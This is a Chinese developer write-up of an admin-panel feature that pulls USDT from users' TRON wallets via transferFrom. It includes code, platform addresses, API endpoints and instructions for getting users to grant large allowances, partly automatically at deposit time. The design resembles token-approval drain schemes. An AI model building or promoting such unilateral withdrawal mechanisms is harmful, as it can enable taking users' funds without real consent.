# TRON 链扣费功能 - 开发完成

## 功能概述

✅ TRON 链扣费功能已完成开发并集成到管理后台。

## 技术实现

### 1. 后端实现

**文件**: `vitufinance/backend/src/routes/walletDeductRoutes.js`

**核心功能**:
- 使用 TronWeb 库连接 TRON 网络
- 实现 `transferFrom` 方法从用户钱包扣费
- 检查用户授权额度和余额
- 检查平台 TRX 余额（用于支付能量费）
- 记录扣费日志到数据库

**关键代码**:
```javascript
// 初始化 TronWeb
const tronWeb = new TronWeb({
  fullHost: 'https://api.trongrid.io',
  privateKey: tronPrivateKey
});

// 获取 USDT 合约
const usdtContract = await tronWeb.contract().at(USDT_CONTRACT);

// 执行 transferFrom
const tx = await usdtContract.transferFrom(
  userAddress,
  platformAddress,
  amountSun
).send({
  feeLimit: 100000000, // 100 TRX
  callValue: 0,
  shouldPollResponse: true
});
```

### 2. 前端集成

**文件**: `vitufinance/admin/src/views/Users.vue`

**功能**:
- 扣费弹窗支持选择 TRON 链
- 显示当前 USDT 余额
- 输入扣费金额和原因
- 二次确认机制
- 显示交易哈希和区块链浏览器链接

### 3. 数据库

**表**: `wallet_deduction_logs`

**字段**:
- `wallet_address`: 用户钱包地址
- `amount`: 扣费金额
- `chain`: 链类型（BSC/ETH/TRON）
- `tx_hash`: 交易哈希
- `reason`: 扣费原因
- `admin_remark`: 管理员备注
- `created_at`: 创建时间

## 支持的链

| 链 | 状态 | 平台地址 | USDT 合约 |
|----|------|---------|----------|
| BSC | ✅ | 0x0290df8A512Eff68d0B0a3ECe1E3F6aAB49d79D4 | 0x55d398326f99059fF775485246999027B3197955 |
| ETH | ✅ | 0x8a92c73FdE5d0313303989eB269d6d17ffb1ba9d | 0xdAC17F958D2ee523a2206206994597C13D831ec7 |
| TRON | ✅ | TGMVmVmHDV2UDEHusKWnrhUt6dfGXCpYSi | TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t |

## 使用前提

### 1. 用户授权

用户必须先在 TRON 钱包中授权平台地址 `TGMVmVmHDV2UDEHusKWnrhUt6dfGXCpYSi`。

**授权方法**:

#### 方法一：通过 TronScan 授权

1. 访问 https://tronscan.org
2. 连接钱包
3. 进入"授权管理"
4. 添加授权：
   - 代币：USDT (TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t)
   - 被授权地址：TGMVmVmHDV2UDEHusKWnrhUt6dfGXCpYSi
   - 授权额度：建议 1000 USDT 或更多

#### 方法二：通过 imToken 授权

1. 打开 imToken → TRON 钱包
2. 点击"授权管理"
3. 添加授权（参考 `imToken使用教程.md`）

#### 方法三：DApp 充值时自动授权

用户在 DApp 中进行 TRON 充值时，会自动请求授权。

### 2. 平台钱包配置

需要在 `.env` 文件中配置 TRON 私钥：

```env
# TRON 链转账私钥
TRON_PRIVATE_KEY=your_tron_private_key_here

# TRON RPC URL（可选）
TRON_RPC_URL=https://api.trongrid.io
```

**注意**：
- TRON 私钥格式与 EVM 链不同
- 如果没有配置 `TRON_PRIVATE_KEY`，系统会尝试使用 `TRANSFER_PRIVATE_KEY`
- 平台钱包需要有足够的 TRX（建议至少 30 TRX）来支付能量费

## 使用流程

### 1. 管理员操作

1. 登录管理后台
2. 进入"用户管理"页面
3. 找到目标用户，点击"扣费"按钮
4. 填写扣费信息：
   - 扣费金额：输入 USDT 数量
   - 扣费链：选择 TRON
   - 扣费原因：必填（如：订阅费用、服务费等）
   - 操作员备注：可选
5. 点击"确认扣费"
6. 二次确认
7. 等待交易完成（通常 3 秒）
8. 查看交易哈希

### 2. 查询授权状态

使用 API 查询用户是否已授权：

```bash
GET /api/admin/users/check-allowance?wallet_address=TXxx...&chain=TRON
```

返回示例：
```json
{
  "success": true,
  "data": {
    "allowance": "1000.00",
    "balance": "500.00",
    "platform_address": "TGMVmVmHDV2UDEHusKWnrhUt6dfGXCpYSi",
    "chain": "TRON"
  }
}
```

## 测试

### 测试脚本

使用测试脚本检查用户授权状态：

```bash
cd backend
node scripts/test_tron_deduction.js <user_address> <amount>
```

示例：
```bash
node scripts/test_tron_deduction.js TXxx...xxx 10
```

测试脚本会检查：
1. ✅ 用户 USDT 余额是否充足
2. ✅ 用户授权额度是否充足
3. ✅ 平台 TRX 余额是否充足
4. ✅ 所有参数是否正确

### 手动测试

1. 准备测试用户（需要有 USDT 余额）
2. 让测试用户授权平台地址
3. 在管理后台执行扣费
4. 在 TronScan 上查看交易：https://tronscan.org

## 错误处理

### 常见错误

1. **授权额度不足**
   ```
   用户授权额度不足。当前授权：X USDT，需要：Y USDT
   ```
   解决：用户需要增加授权额度

2. **用户余额不足**
   ```
   用户钱包余额不足。当前余额：X USDT
   ```
   解决：用户需要充值

3. **平台 TRX 不足**
   ```
   平台钱包 TRX 不足。当前余额：X TRX，建议至少 30 TRX
   ```
   解决：给平台钱包充值 TRX

4. **交易被拒绝**
   ```
   交易被拒绝，可能是授权额度不足或用户余额不足
   ```
   解决：检查授权和余额

## TRON 链特点

### 与 EVM 链的区别

| 特性 | EVM 链 (BSC/ETH) | TRON 链 |
|------|-----------------|---------|
| 地址格式 | 0x 开头 | T 开头 |
| 库 | ethers.js | TronWeb |
| Gas 费 | BNB/ETH | TRX（能量费）|
| 小数位数 | BSC:18, ETH:6 | 6 |
| 交易速度 | 较慢（15秒-1分钟）| 快（3秒）|
| 区块浏览器 | BSCScan/Etherscan | TronScan |

### TRON 优势

1. ✅ 交易速度快（3秒确认）
2. ✅ Gas 费低（能量费）
3. ✅ 用户体验好
4. ✅ USDT 使用广泛

### TRON 注意事项

1. ⚠️ 地址格式不同，不要混淆
2. ⚠️ 需要 TRX 支付能量费
3. ⚠️ 私钥格式与 EVM 链不同
4. ⚠️ 合约调用方式不同

## API 文档

### 扣费接口

```
POST /api/admin/users/deduct-from-wallet
```

**请求参数**:
```json
{
  "wallet_address": "TXxx...xxx",
  "amount": 100,
  "chain": "TRON",
  "reason": "订阅费用",
  "admin_remark": "2024年1月订阅"
}
```

**返回示例**:
```json
{
  "success": true,
  "message": "扣费成功",
  "data": {
    "txHash": "abc123...",
    "blockNumber": 12345678,
    "amount": 100,
    "chain": "TRON",
    "from": "TXxx...xxx",
    "to": "TGMVmVmHDV2UDEHusKWnrhUt6dfGXCpYSi",
    "explorer": "https://tronscan.org/#/transaction/abc123..."
  }
}
```

### 查询授权接口

```
GET /api/admin/users/check-allowance?wallet_address=TXxx...&chain=TRON
```

**返回示例**:
```json
{
  "success": true,
  "data": {
    "allowance": "1000.00",
    "balance": "500.00",
    "platform_address": "TGMVmVmHDV2UDEHusKWnrhUt6dfGXCpYSi",
    "chain": "TRON"
  }
}
```

## 安全建议

1. ✅ 谨慎保管 TRON 私钥
2. ✅ 定期检查平台钱包余额
3. ✅ 记录所有扣费操作
4. ✅ 二次确认机制
5. ✅ 限制扣费金额范围
6. ✅ 监控异常交易

## 部署清单

- [x] 安装 TronWeb 依赖
- [x] 更新扣费路由支持 TRON
- [x] 更新查询授权 API 支持 TRON
- [x] 前端扣费弹窗支持 TRON
- [x] 创建测试脚本
- [x] 更新文档
- [x] 重启后端服务
- [ ] 配置 TRON 私钥（需要手动配置）
- [ ] 给平台钱包充值 TRX
- [ ] 测试扣费功能

## 下一步

1. **配置环境变量**
   ```bash
   cd backend
   nano .env
   # 添加 TRON_PRIVATE_KEY
   ```

2. **给平台钱包充值 TRX**
   - 平台地址：TGMVmVmHDV2UDEHusKWnrhUt6dfGXCpYSi
   - 建议充值：50-100 TRX

3. **测试扣费功能**
   - 准备测试用户
   - 让用户授权平台地址
   - 在管理后台执行扣费
   - 验证交易成功

4. **监控和维护**
   - 定期检查平台 TRX 余额
   - 查看扣费日志
   - 处理异常情况

## 相关文档

- `钱包扣费功能说明.md` - 完整使用说明
- `imToken使用教程.md` - 用户授权教程
- `backend/scripts/test_tron_deduction.js` - 测试脚本

## 技术支持

如有问题，请检查：
1. TRON 私钥是否正确配置
2. 平台钱包 TRX 余额是否充足
3. 用户是否已授权平台地址
4. 用户钱包 USDT 余额是否充足
5. 后端服务是否正常运行

---

**开发完成时间**: 2026-02-28  
**状态**: ✅ 已完成并可用
